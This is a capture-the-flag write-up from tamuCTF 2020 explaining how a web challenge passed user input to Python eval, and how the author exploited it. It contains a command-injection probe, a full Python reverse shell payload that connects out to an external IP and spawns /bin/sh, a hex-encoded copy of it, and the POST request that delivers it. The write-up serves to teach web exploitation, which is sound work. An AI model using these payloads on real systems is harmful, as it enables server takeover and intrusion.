---
layout: blogpost
title:  "tamuCTF - Exploiting Python Eval"
date:   2020-03-23 03:32:01 +0300
categories: ctf
---

## Category: 
Web
## Difficulty: 
Hard
## Challenge: 
Mental Math
## Description: 
My first web app, check it out!
<br>
## Solution:

The application presents you with a math question and expects an answer. The interesting thing is that it makes an ajax call very often (any time it detects you input something to the box) and looks to see if you have submitted the answer to its question of course you would normally answer the question. When you do, it will accept your answer and spit another one out. It does so like this
<br>
```javascript
function submitProblem() {
    $.post("/ajax/new_problem", {'problem': $("#problem").html(), 'answer': $('#answer').val()}, function ( data ) {
      if (data.correct) {
        $('#problem').html(data.problem);
        $('#answer').val('');
      }
    });
  }
$(document).ready(function() {
  $("#answer").on('input', submitProblem);
  submitProblem();
});
```
<br>
What's even more interesting though is that youre able to respond with the servers question back at it... so when you do something like
<br>
```javascript
$.post("/ajax/new_problem", {'problem': 0+0, 'answer': 0+0}, function ( data ) {
  if (data.correct) {
    $('#problem').html(data.problem);
    $('#answer').val('');
  }
});
```
<br>
you get a response object saying that the answer was correct...
This means something on the back end must be executing our inputs on the server to test the parameters equality. This is when I noticed there was a comment on the HTML page containing the chars "% }{ %" which are used in Flask and Django. Python ```eval() or exec()```? In order to try and abuse this I tried to inject code with a request like
<br>
```javascript
$.post("/ajax/new_problem", 
  {'problem': 0+0, 'answer': "0;ls"}, function ( data ) {
  if (data.correct) {
    $('#problem').html(data.problem);
    $('#answer').val('');
  }
});
```
<br>
and many other queries, most of which didnt output anything or gave me a dreaded "Internal Server Error".<br>
The most interesting part of the Internal Server error was that it seemed to occur EVERY time under a single condition: I sent a post request using the console, and answer's value contained SOMETHING that was not a number. (different things I did to test this were sending the same request with $.ajax,$.get,$.post, python requests, and burpsuite)<br>
To see if this was simply a WAF looking for anything non-numeric, I base64 encoded a string with and without numeric strings, and sent both in the console with a post request with the format answer : btoa(string). As you'd expect, the string that was not purely numeric failed but the base64 encoded number still returned true whenever the query would've been true.<br>
After a lot of failures at injecting commands (they seemed to work but I wasnt getting output) I ended up converting my payloads to hex and trying to execute them with the same results as base64 encoding them.<br>
Finally I decided to try a reverse shell as a payload if I wasnt able to see the output, but was still able to execute code. After the ascii payload didnt work, the base64 encoded payload didnt work, and a hex payload didnt work, I realized that I had only been trying to inject the payload to the answer parameter because thats where I first noticed the vuln, but unless there was a predefined table for all of the possible math questions this app might give you, the problem must have also been calculating its own answer when an answer was compared to it.
<br>
Encoding this string into hex gave the payload
 <br>
```python
__import__('os').system("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"3.14.67.85\",9000));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"])'")
```
<br>
<br>
```javascript
"\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x27\x6f\x73\x27\x29\x2e\x73\x79\x73\x74\x65\x6d\x28\x22\x70\x79\x74\x68\x6f\x6e\x20\x2d\x63\x20\x27\x69\x6d\x70\x6f\x72\x74\x20\x73\x6f\x63\x6b\x65\x74\x2c\x73\x75\x62\x70\x72\x6f\x63\x65\x73\x73\x2c\x6f\x73\x3b\x73\x3d\x73\x6f\x63\x6b\x65\x74\x2e\x73\x6f\x63\x6b\x65\x74\x28\x73\x6f\x63\x6b\x65\x74\x2e\x41\x46\x5f\x49\x4e\x45\x54\x2c\x73\x6f\x63\x6b\x65\x74\x2e\x53\x4f\x43\x4b\x5f\x53\x54\x52\x45\x41\x4d\x29\x3b\x73\x2e\x63\x6f\x6e\x6e\x65\x63\x74\x28\x28\x5c\x22\x33\x2e\x31\x34\x2e\x36\x37\x2e\x38\x35\x5c\x22\x2c\x39\x30\x30\x30\x29\x29\x3b\x6f\x73\x2e\x64\x75\x70\x32\x28\x73\x2e\x66\x69\x6c\x65\x6e\x6f\x28\x29\x2c\x30\x29\x3b\x6f\x73\x2e\x64\x75\x70\x32\x28\x73\x2e\x66\x69\x6c\x65\x6e\x6f\x28\x29\x2c\x31\x29\x3b\x6f\x73\x2e\x64\x75\x70\x32\x28\x73\x2e\x66\x69\x6c\x65\x6e\x6f\x28\x29\x2c\x32\x29\x3b\x70\x3d\x73\x75\x62\x70\x72\x6f\x63\x65\x73\x73\x2e\x63\x61\x6c\x6c\x28\x5b\x5c\x22\x2f\x62\x69\x6e\x2f\x73\x68\x5c\x22\x2c\x5c\x22\x2d\x69\x5c\x22\x5d\x29\x27\x22\x29"
```
<br>
I sent the post request while running a netcat listener on my local machine
<br>
```javascript
$.post("/ajax/new_problem", {"problem":"\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x27\x6f\x73\x27\x29\x2e\x73\x79\x73\x74\x65\x6d\x28\x22\x70\x79\x74\x68\x6f\x6e\x20\x2d\x63\x20\x27\x69\x6d\x70\x6f\x72\x74\x20\x73\x6f\x63\x6b\x65\x74\x2c\x73\x75\x62\x70\x72\x6f\x63\x65\x73\x73\x2c\x6f\x73\x3b\x73\x3d\x73\x6f\x63\x6b\x65\x74\x2e\x73\x6f\x63\x6b\x65\x74\x28\x73\x6f\x63\x6b\x65\x74\x2e\x41\x46\x5f\x49\x4e\x45\x54\x2c\x73\x6f\x63\x6b\x65\x74\x2e\x53\x4f\x43\x4b\x5f\x53\x54\x52\x45\x41\x4d\x29\x3b\x73\x2e\x63\x6f\x6e\x6e\x65\x63\x74\x28\x28\x5c\x22\x33\x2e\x31\x34\x2e\x36\x37\x2e\x38\x35\x5c\x22\x2c\x39\x30\x30\x30\x29\x29\x3b\x6f\x73\x2e\x64\x75\x70\x32\x28\x73\x2e\x66\x69\x6c\x65\x6e\x6f\x28\x29\x2c\x30\x29\x3b\x6f\x73\x2e\x64\x75\x70\x32\x28\x73\x2e\x66\x69\x6c\x65\x6e\x6f\x28\x29\x2c\x31\x29\x3b\x6f\x73\x2e\x64\x75\x70\x32\x28\x73\x2e\x66\x69\x6c\x65\x6e\x6f\x28\x29\x2c\x32\x29\x3b\x70\x3d\x73\x75\x62\x70\x72\x6f\x63\x65\x73\x73\x2e\x63\x61\x6c\x6c\x28\x5b\x5c\x22\x2f\x62\x69\x6e\x2f\x73\x68\x5c\x22\x2c\x5c\x22\x2d\x69\x5c\x22\x5d\x29\x27\x22\x29","answer":""}, function (data) {
      if (data.correct) {
          console.log(data);
      }
});
```
<br>
after sending the request we pop a reverse shell and get
<br>
![mental_math_flag](/assets/images/ctf/tamu2020/mental_math_flag.PNG)
